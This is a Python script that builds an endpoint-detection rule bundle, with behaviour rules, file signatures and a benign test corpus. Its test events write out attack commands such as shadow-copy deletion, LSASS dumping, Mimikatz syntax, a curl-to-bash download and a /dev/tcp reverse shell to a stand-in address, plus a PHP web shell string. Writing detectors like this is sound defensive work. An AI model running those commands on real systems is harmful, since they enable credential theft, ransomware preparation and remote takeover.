import json, sys
TS = "2026-11-10T12:00:00Z"
def P(name, cmd, exe=None, pid=4242, user=None):
    d = {"pid": pid, "ppid": 1000, "name": name, "command_line": cmd}
    if exe: d["exe"] = exe
    if user: d["user"] = user
    return d
def proc(name, cmd, parent=("explorer.exe", "C:\\Windows\\explorer.exe"), exe=None, user=None):
    e = {"ts": TS, "kind": "process", "action": "start", "process": P(name, cmd, exe, user=user)}
    if parent: e["parent"] = {"pid": 1000, "name": parent[0], "command_line": parent[1]}
    return e
def file(action, path, old=None, pid=None):
    e = {"ts": TS, "kind": "file", "action": action, "file": {"path": path}}
    if old: e["file"]["old_path"] = old
    if pid: e["process"] = P("enc.exe", "enc.exe", pid=pid)
    return e
def reg(action, key, value, data=None):
    e = {"ts": TS, "kind": "registry", "action": action, "registry": {"key": key, "value": value}}
    if data: e["registry"]["data"] = data
    return e
def net(remote, port, name="svc.exe"):
    return {"ts": TS, "kind": "network", "action": "connect", "process": P(name, name),
            "network": {"protocol": "tcp", "local_addr": "10.0.0.5", "local_port": 50123, "remote_addr": remote, "remote_port": port}}
def mod(name):
    return {"ts": TS, "kind": "module", "action": "load", "module": {"name": name}}
def f(field, op, value=None):
    d = {"field": field, "op": op}
    if value is not None: d["value"] = value
    return d
ALL = lambda *x: {"all": list(x)}
ANY = lambda *x: {"any": list(x)}
NOT = lambda x: {"not": x}
def T(ev, expect): return {"event": ev, "expect": expect}

rules = []
def R(id, name, desc, sev, conf, mode, mitre, event, when, tests, actions=None, threshold=None):
    r = {"id": id, "name": name, "description": desc, "severity": sev, "confidence": conf, "mode": mode,
         "mitre": mitre, "event": event, "when": when, "tests": tests}
    if actions: r["actions"] = actions
    if threshold: r["threshold"] = threshold
    rules.append(r)

SHELLS = ["cmd", "powershell", "pwsh", "wscript", "cscript", "mshta", "rundll32", "regsvr32"]
R("RMM-B-0001", "Volume shadow copies deleted", "vssadmin deleting or shrinking shadow copies, the first step of most ransomware.",
  "severe", "high", "alert", ["T1490"], "process",
  ALL(f("process.name", "equals", "vssadmin"), f("process.command_line", "regex", [r"delete\s+shadows", r"resize\s+shadowstorage.*maxsize=\s*(401|[0-9]{1,3})mb"])),
  [T(proc("vssadmin.exe", "vssadmin.exe Delete Shadows /All /Quiet"), True), T(proc("vssadmin.exe", "vssadmin list shadows"), False)], ["start"])
R("RMM-B-0002", "Shadow copies deleted through WMI", "wmic or PowerShell deleting Win32_ShadowCopy objects.",
  "severe", "high", "alert", ["T1490"], "process",
  ANY(ALL(f("process.name", "equals", "wmic"), f("process.command_line", "regex", [r"shadowcopy\s+delete"])),
      ALL(f("process.name", "equals", ["powershell", "pwsh"]), f("process.command_line", "contains", "win32_shadowcopy"), f("process.command_line", "contains", ["delete", "remove-"]))),
  [T(proc("WMIC.exe", "wmic shadowcopy delete /nointeractive"), True),
   T(proc("powershell.exe", "powershell Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete()}"), True),
   T(proc("wmic.exe", "wmic shadowcopy list brief"), False)], ["start"])
R("RMM-B-0003", "Windows recovery disabled", "bcdedit switching off automatic repair, which ransomware does before encrypting.",
  "high", "high", "alert", ["T1490"], "process",
  ALL(f("process.name", "equals", "bcdedit"), f("process.command_line", "regex", [r"recoveryenabled\s+(no|off|0)", r"bootstatuspolicy\s+ignoreallfailures"])),
  [T(proc("bcdedit.exe", "bcdedit /set {default} recoveryenabled No"), True), T(proc("bcdedit.exe", "bcdedit /enum"), False)], ["start"])
R("RMM-B-0004", "Backup catalog deleted", "wbadmin deleting the backup catalog or system state backups.",
  "high", "high", "alert", ["T1490"], "process",
  ALL(f("process.name", "equals", "wbadmin"), f("process.command_line", "regex", [r"delete\s+(catalog|systemstatebackup|backup)"])),
  [T(proc("wbadmin.exe", "wbadmin delete catalog -quiet"), True), T(proc("wbadmin.exe", "wbadmin get versions"), False)], ["start"])
mass = [file("rename", f"/home/a/doc{i}.pdf.locked", f"/home/a/doc{i}.pdf", pid=77) for i in range(30)]
R("RMM-B-0005", "Many files renamed by one process", "30 renames within a minute by the same process, in watched folders: typical of encryption.",
  "high", "low", "audit", ["T1486"], "file",
  f("file.old_path", "exists"),
  [{"events": mass, "expect": True}, {"events": mass[:10], "expect": False}], ["rename"],
  {"count": 30, "seconds": 60, "group_by": "process.pid"})
R("RMM-B-0006", "LSASS dumped with comsvcs.dll", "rundll32 calling comsvcs MiniDump, a common way to steal credentials from memory.",
  "severe", "high", "alert", ["T1003.001"], "process",
  ALL(f("process.command_line", "contains", "comsvcs"), f("process.command_line", "contains", "minidump")),
  [T(proc("rundll32.exe", "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"), True),
   T(proc("rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL"), False)], ["start"])
R("RMM-B-0007", "LSASS dumped with ProcDump", "Sysinternals ProcDump pointed at lsass.",
  "severe", "high", "alert", ["T1003.001"], "process",
  ALL(f("process.name", "equals", ["procdump", "procdump64"]), f("process.command_line", "contains", "lsass")),
  [T(proc("procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe lsass.dmp"), True),
   T(proc("procdump.exe", "procdump -ma w3wp.exe"), False)], ["start"])
R("RMM-B-0008", "Mimikatz commands", "Mimikatz module syntax on a command line.",
  "severe", "high", "alert", ["T1003", "T1558"], "process",
  f("process.command_line", "contains", ["sekurlsa::", "lsadump::", "kerberos::golden", "privilege::debug", "invoke-mimikatz"]),
  [T(proc("m.exe", "m.exe privilege::debug sekurlsa::logonpasswords exit"), True), T(proc("notepad.exe", "notepad.exe notes.txt"), False)], ["start"])
R("RMM-B-0009", "Credential hives saved", "reg.exe saving the SAM, SECURITY or SYSTEM hive, to crack offline.",
  "high", "high", "alert", ["T1003.002"], "process",
  ALL(f("process.name", "equals", "reg"), f("process.command_line", "regex", [r"\b(save|export)\s+(hklm|hkey_local_machine)\\(sam|security|system)\b"])),
  [T(proc("reg.exe", "reg save HKLM\\SAM C:\\temp\\sam.hiv"), True), T(proc("reg.exe", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services"), False)], ["start"])
R("RMM-B-0010", "Shadow password file copied", "Copying, encoding or sending /etc/shadow.",
  "high", "medium", "audit", ["T1003.008"], "process",
  ALL(f("process.command_line", "contains", "/etc/shadow"), f("process.name", "equals", ["cat", "cp", "tar", "base64", "xxd", "scp", "curl", "nc", "zip", "python3", "python"])),
  [T(proc("cp", "cp /etc/shadow /tmp/.s", parent=("bash", "bash")), True), T(proc("passwd", "passwd alice", parent=("bash", "bash")), False)], ["start"])
R("RMM-B-0011", "Program added to a Run key", "A new value under a Run or RunOnce key starts a program at every sign-in.",
  "medium", "low", "audit", ["T1547.001"], "registry",
  ALL(f("registry.key", "regex", [r"\\software\\(wow6432node\\)?microsoft\\windows\\currentversion\\run(once)?$"])),
  [T(reg("set", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", "C:\\Users\\Public\\u.exe"), True),
   T(reg("set", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\X", "DisplayName", "X"), False)], ["set"])
R("RMM-B-0012", "Scheduled task created from a user folder", "schtasks /create running something from Temp, AppData, Public or ProgramData.",
  "medium", "medium", "audit", ["T1053.005"], "process",
  ALL(f("process.name", "equals", "schtasks"), f("process.command_line", "contains", "/create"),
      f("process.command_line", "contains", ["\\temp\\", "\\appdata\\", "\\users\\public\\", "\\programdata\\"])),
  [T(proc("schtasks.exe", "schtasks /create /sc minute /tn upd /tr C:\\Users\\Public\\upd.exe"), True),
   T(proc("schtasks.exe", "schtasks /query /fo list"), False)], ["start"])
R("RMM-B-0013", "systemd service added", "A new unit file under /etc/systemd/system.",
  "medium", "low", "audit", ["T1543.002"], "file",
  ALL(f("file.path", "starts_with", "/etc/systemd/system/"), f("file.extension", "equals", ["service", "timer"])),
  [T(file("create", "/etc/systemd/system/kworker.service"), True), T(file("create", "/etc/systemd/system/x.conf"), False)], ["create"])
R("RMM-B-0014", "Crontab changed", "System or user crontabs created or modified.",
  "low", "low", "audit", ["T1053.003"], "file",
  f("file.path", "starts_with", ["/etc/cron", "/var/spool/cron/"]),
  [T(file("modify", "/var/spool/cron/crontabs/root"), True), T(file("modify", "/etc/hosts"), False)], ["create", "modify"])
R("RMM-B-0015", "SSH authorized keys changed", "A key added to someone's authorized_keys gives lasting access.",
  "medium", "medium", "audit", ["T1098.004"], "file",
  f("file.path", "ends_with", ["/.ssh/authorized_keys", "/.ssh/authorized_keys2"]),
  [T(file("modify", "/root/.ssh/authorized_keys"), True), T(file("modify", "/root/.ssh/known_hosts"), False)], ["create", "modify"])
R("RMM-B-0016", "Library preload hijack", "/etc/ld.so.preload makes every program load a library: rootkits use it.",
  "high", "high", "alert", ["T1574.006"], "file",
  f("file.path", "equals", "/etc/ld.so.preload"),
  [T(file("create", "/etc/ld.so.preload"), True), T(file("create", "/etc/ld.so.conf.d/x.conf"), False)], ["create", "modify"])
R("RMM-B-0017", "Service created from a user folder", "sc.exe create with the binary in Temp, AppData or Public.",
  "high", "medium", "audit", ["T1543.003"], "process",
  ALL(f("process.name", "equals", "sc"), f("process.command_line", "contains", "create"),
      f("process.command_line", "contains", ["\\temp\\", "\\appdata\\", "\\users\\public\\"])),
  [T(proc("sc.exe", "sc create svc binpath= C:\\Users\\Public\\s.exe start= auto"), True), T(proc("sc.exe", "sc query spooler"), False)], ["start"])
R("RMM-B-0018", "Encoded PowerShell command", "PowerShell run with a long base64 -EncodedCommand, which hides what it does.",
  "medium", "medium", "audit", ["T1059.001", "T1027"], "process",
  ALL(f("process.name", "equals", ["powershell", "pwsh"]), f("process.command_line", "regex", [r"\s-e(c|nc|ncodedcommand)?\s+[a-z0-9+/=]{40,}"])),
  [T(proc("powershell.exe", "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"), True),
   T(proc("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1"), False)], ["start"])
R("RMM-B-0019", "certutil used to download", "certutil -urlcache fetching a file, a common living-off-the-land download.",
  "high", "high", "alert", ["T1105"], "process",
  ALL(f("process.name", "equals", "certutil"), f("process.command_line", "contains", ["urlcache", "verifyctl"]), f("process.command_line", "contains", ["http://", "https://"])),
  [T(proc("certutil.exe", "certutil -urlcache -split -f http://203.0.113.9/a.exe a.exe"), True), T(proc("certutil.exe", "certutil -hashfile setup.exe SHA256"), False)], ["start"])
R("RMM-B-0020", "Download piped into a shell", "curl or wget output run straight by a shell.",
  "medium", "low", "audit", ["T1059.004", "T1105"], "process",
  f("process.command_line", "regex", [r"(curl|wget)\b[^|;]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b"]),
  [T(proc("bash", "bash -c curl -s http://203.0.113.9/x | bash", parent=("sshd", "sshd")), True),
   T(proc("bash", "bash -c curl -fsSL https://example.com/f -o f", parent=("sshd", "sshd")), False)], ["start"])
R("RMM-B-0021", "Defender protection switched off", "Set-MpPreference turning off real-time, behaviour or download scanning.",
  "high", "high", "alert", ["T1562.001"], "process",
  ALL(f("process.command_line", "contains", "set-mppreference"),
      f("process.command_line", "regex", [r"-disable(realtimemonitoring|behaviormonitoring|ioavprotection|scriptscanning)\s+(\$true|1)"])),
  [T(proc("powershell.exe", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"), True),
   T(proc("powershell.exe", "powershell Set-MpPreference -SignatureUpdateInterval 4"), False)], ["start"])
R("RMM-B-0022", "Event logs cleared", "wevtutil cl or Clear-EventLog erasing the Windows logs.",
  "high", "medium", "audit", ["T1070.001"], "process",
  ANY(ALL(f("process.name", "equals", "wevtutil"), f("process.command_line", "regex", [r"\s(cl|clear-log)\s"])),
      f("process.command_line", "contains", "clear-eventlog")),
  [T(proc("wevtutil.exe", "wevtutil cl Security"), True), T(proc("wevtutil.exe", "wevtutil qe System /c:5"), False)], ["start"])
R("RMM-B-0023", "Linux audit trail tampered with", "Audit rules deleted, or shell history wiped.",
  "medium", "medium", "audit", ["T1070.003", "T1562.012"], "process",
  ANY(ALL(f("process.name", "equals", "auditctl"), f("process.command_line", "regex", [r"\s-D\b", r"\s-e\s*0\b"])),
      f("process.command_line", "regex", [r"history\s+-c", r"unset\s+histfile", r"rm\s+(-f\s+)?\S*\.bash_history", r"ln\s+-sf?\s+/dev/null\s+\S*\.bash_history"])),
  [T(proc("auditctl", "auditctl -D", parent=("bash", "bash")), True), T(proc("auditctl", "auditctl -l", parent=("bash", "bash")), False)], ["start"])
R("RMM-B-0024", "Office app started a shell", "Word, Excel, PowerPoint or Outlook starting a command shell or script host: usually a malicious document.",
  "high", "high", "alert", ["T1566.001", "T1204.002"], "process",
  ALL(f("parent.name", "equals", ["winword", "excel", "powerpnt", "outlook", "msaccess", "mspub"]), f("process.name", "equals", SHELLS)),
  [T(proc("powershell.exe", "powershell -w hidden -c iex", parent=("WINWORD.EXE", "WINWORD.EXE /n invoice.docm")), True),
   T(proc("splwow64.exe", "splwow64.exe 8192", parent=("WINWORD.EXE", "WINWORD.EXE")), False)], ["start"])
R("RMM-B-0025", "Reverse shell one-liner", "A shell wired to a network socket.",
  "high", "medium", "audit", ["T1059"], "process",
  f("process.command_line", "regex", [r"(ba)?sh\s+-i\s*>&\s*/dev/tcp/", r"\bnc(at)?\b.*\s-e\s+/bin/(ba)?sh", r"socket\.socket\(.*(subprocess|pty\.spawn)", r"mkfifo\s+\S+;.*\bnc\b"]),
  [T(proc("bash", "bash -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", parent=("php-fpm", "php-fpm")), True),
   T(proc("bash", "bash -c echo hello > /dev/null", parent=("cron", "cron")), False)], ["start"])
R("RMM-B-0026", "Connection to a mining or C2 port", "Outbound connections to ports used by miners and common C2 defaults.",
  "low", "low", "audit", ["T1571", "T1496"], "network",
  ALL(f("network.remote_port", "equals", ["3333", "4444", "5555", "14444", "45700"]), NOT(f("network.remote_addr", "regex", [r"^(127\.|10\.|192\.168\.|::1$)"]))),
  [T(net("198.51.100.20", 3333), True), T(net("198.51.100.20", 443), False)], ["connect"])
R("RMM-B-0027", "Known rootkit module loaded", "A Linux kernel module with the name of a public rootkit.",
  "severe", "high", "alert", ["T1547.006", "T1014"], "module",
  f("module.name", "equals", ["diamorphine", "reptile", "reptile_module", "suterusu", "adore_ng", "kovid"]),
  [T(mod("diamorphine"), True), T(mod("nf_conntrack"), False)], ["load"])

def hexs(s): return " ".join(f"{b:02x}" for b in s.encode())
EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
file_rules = [
  {"id": "RMM-F-0001", "name": "EICAR test file", "severity": "low", "confidence": "high", "mode": "alert", "mitre": [],
   "strings": [{"hex": hexs(EICAR)}], "max_size": 4096,
   "tests": [{"hex": hexs(EICAR), "expect": True}, {"text": "an ordinary file", "expect": False}]},
  {"id": "RMM-F-0002", "name": "Mimikatz binary", "severity": "severe", "confidence": "high", "mode": "alert", "mitre": ["T1003"],
   "strings": [{"hex": hexs("sekurlsa::logonpasswords"), "nocase": True}, {"hex": hexs("gentilkiwi"), "nocase": True}, {"hex": hexs("mimikatz"), "nocase": True}],
   "condition": {"at_least": 2}, "header": {"hex": "4d 5a"},
   "tests": [{"hex": hexs("MZ\x90 ... gentilkiwi ... sekurlsa::LogonPasswords ..."), "expect": True},
             {"hex": hexs("A note quoting gentilkiwi and sekurlsa::logonpasswords, not a program"), "expect": False},
             {"hex": hexs("mimikatz is mentioned once in this article"), "expect": False}]},
  {"id": "RMM-F-0003", "name": "PHP web shell", "severity": "high", "confidence": "medium", "mode": "audit", "mitre": ["T1505.003"],
   "strings": [{"hex": hexs("eval(base64_decode($_"), "nocase": True}, {"hex": hexs("system($_get["), "nocase": True}, {"hex": hexs("assert($_post["), "nocase": True}, {"hex": hexs("passthru($_request["), "nocase": True}],
   "max_size": 2097152,
   "tests": [{"text": "<?php system($_GET['c']); ?>", "expect": True}, {"text": "<?php echo htmlspecialchars($_GET['q']); ?>", "expect": False}]},
  {"id": "RMM-F-0004", "name": "Cobalt Strike beacon", "severity": "severe", "confidence": "medium", "mode": "audit", "mitre": ["T1071.001"],
   "strings": [{"hex": hexs("beacon.dll")}, {"hex": hexs("ReflectiveLoader")}, {"hex": hexs("%s as %s\\%s: %d")}],
   "condition": {"at_least": 2},
   "tests": [{"text": "MZ...beacon.dll...ReflectiveLoader...", "expect": True}, {"text": "MZ...ReflectiveLoader only", "expect": False}]},
]
bundle = {"version": "2026.11.15.1", "created_at": "2026-11-10T00:00:00Z",
  "description": "Starter content: ransomware preparation, credential theft, persistence, execution and defence evasion. Rules marked audit record hits without alerting until their false-positive rate is known.",
  "hashes": [{"sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", "name": "EICAR test file", "severity": "low"}],
  "file_rules": file_rules, "behaviour_rules": rules}
out = sys.argv[1]
json.dump(bundle, open(out + "/starter.json", "w"), indent=1)

benign = [
 proc("vssadmin.exe", "vssadmin list shadows"), proc("vssadmin.exe", "vssadmin list writers"),
 proc("wmic.exe", "wmic os get caption"), proc("bcdedit.exe", "bcdedit /enum all"), proc("wbadmin.exe", "wbadmin get versions"),
 proc("wbadmin.exe", "wbadmin start backup -backupTarget:E: -include:C: -quiet"),
 proc("rundll32.exe", "rundll32.exe C:\\Windows\\system32\\shell32.dll,Control_RunDLL desk.cpl"),
 proc("procdump.exe", "procdump -ma -e w3wp.exe C:\\dumps"), proc("reg.exe", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"),
 proc("reg.exe", "reg export HKLM\\SOFTWARE\\Vendor C:\\backup\\vendor.reg"), proc("schtasks.exe", "schtasks /query /fo csv /v"),
 proc("schtasks.exe", "schtasks /create /tn Backup /tr C:\\Program Files\\Backup\\run.exe /sc daily /st 02:00"),
 proc("sc.exe", "sc query wuauserv"), proc("sc.exe", "sc create MyAgent binPath= \"C:\\Program Files\\Vendor\\agent.exe\""),
 proc("powershell.exe", "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Program Files\\RMM\\scripts\\inventory.ps1"),
 proc("powershell.exe", "powershell -c Get-MpComputerStatus | ConvertTo-Json"), proc("powershell.exe", "powershell Set-MpPreference -ExclusionPath D:\\SQLData"),
 proc("powershell.exe", "powershell -enc ZQBjAGgAbwA="), proc("certutil.exe", "certutil -hashfile C:\\setup.exe SHA256"),
 proc("certutil.exe", "certutil -store my"), proc("wevtutil.exe", "wevtutil qe System /c:20 /rd:true /f:text"), proc("wevtutil.exe", "wevtutil el"),
 proc("cmd.exe", "cmd /c dir C:\\Users", parent=("explorer.exe", "explorer.exe")),
 proc("chrome.exe", "chrome.exe --type=renderer", parent=("chrome.exe", "chrome.exe")),
 proc("splwow64.exe", "splwow64.exe 12288", parent=("WINWORD.EXE", "WINWORD.EXE")),
 proc("excel.exe", "EXCEL.EXE /dde", parent=("explorer.exe", "explorer.exe")),
 proc("msedge.exe", "msedge.exe https://outlook.office.com", parent=("OUTLOOK.EXE", "OUTLOOK.EXE")),
 proc("git.exe", "git pull --rebase", parent=("pwsh.exe", "pwsh")),
 proc("bash", "bash -c apt-get update && apt-get -y upgrade", parent=("sshd", "sshd: admin")),
 proc("curl", "curl -fsSL https://get.docker.com -o get-docker.sh", parent=("bash", "bash")),
 proc("bash", "bash -c curl -s https://api.example.com/health | jq .status", parent=("cron", "cron")),
 proc("wget", "wget -q https://example.com/backup.tar.gz -O /tmp/b.tgz", parent=("bash", "bash")),
 proc("cat", "cat /etc/passwd", parent=("bash", "bash")), proc("getent", "getent shadow alice", parent=("bash", "bash")),
 proc("auditctl", "auditctl -l", parent=("bash", "bash")), proc("auditctl", "auditctl -w /etc/passwd -p wa", parent=("augenrules", "augenrules")),
 proc("python3", "python3 -c import socket; print(socket.gethostname())", parent=("bash", "bash")),
 proc("nc", "nc -zv db01 5432", parent=("bash", "bash")), proc("systemctl", "systemctl restart nginx", parent=("sudo", "sudo systemctl restart nginx")),
 proc("tar", "tar czf /backup/etc.tgz /etc", parent=("cron", "cron")), proc("history", "history 20", parent=("bash", "bash")),
 file("modify", "/etc/hosts"), file("modify", "/home/alice/.bashrc"), file("create", "/etc/systemd/system/nginx.service.d/override.conf"),
 file("modify", "/root/.ssh/known_hosts"), file("create", "/etc/ld.so.conf.d/libfoo.conf"),
 file("rename", "/home/alice/report.docx", "/home/alice/~$report.docx", pid=900),
 reg("set", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{ABC}", "DisplayName", "7-Zip"),
 reg("set", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0"),
 net("140.82.112.3", 443, "git.exe"), net("10.0.0.20", 4444, "app.exe"), net("192.168.1.10", 3333, "grafana"),
 net("198.51.100.30", 5432, "psql"), mod("nf_conntrack"), mod("overlay"), mod("wireguard"),
]
with open(out + "/benign.jsonl", "w") as fh:
    fh.write("// Benign corpus: ordinary admin and software activity that no rule may fire on.\n")
    for e in benign: fh.write(json.dumps(e) + "\n")
print(len(rules), "behaviour rules,", len(file_rules), "file rules,", len(benign), "benign events")
